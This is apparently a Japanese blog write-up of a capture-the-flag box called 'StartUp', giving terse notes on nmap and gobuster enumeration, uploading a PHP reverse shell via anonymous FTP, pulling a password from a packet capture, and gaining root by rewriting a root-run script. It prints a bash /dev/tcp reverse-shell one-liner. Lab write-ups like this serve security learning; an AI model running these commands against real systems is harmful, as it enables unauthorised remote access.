---
title: "StartUp"
date: 2024-02-21T02:52:30+09:00
draft: false
---

最近 KAGOME の朝フルーツこれ一本を昼ごはんにしている\
健康になった気でいる

### enum

- nmap
  - ftp
  - ssh
  - http
- gobuster
  - files

### FTP

- anonymous ログインができる
- http から files で中身が見れて，ftp の中身が同期していることが分かる
- php のリバースシェルを配置する
  - ```put php-reverse-shell.php```

### シェル

- とりあえず中に入るとレシピが見れる
- lennie でログインする必要がある
- ./incidents ディレクトリ内で .pcapng が手に入る
- wireshark で .pcapng の TCP ストリームを追うとパスワードが手に入る
- これが lennie のパスワードだった(!?)
- あとは user.txt

### root.txt

- ./linpeas.sh はすぐに使えそうなものはない．．．
- ./scripts ディレクトリがあるので探してみる
  - ./planner.sh が root で動作している
  - ./planner.sh が呼び出す ./print.sh は lennie が所有している
  - lennei で print.sh を書き換えて bash を呼び出せば root シェルが手に入る
    - ```echo "/bin/bash -i >& /dev/tcp/[ip]/8888 0>&1" > /etc/print.sh```
  - robot.txt を手に入れる
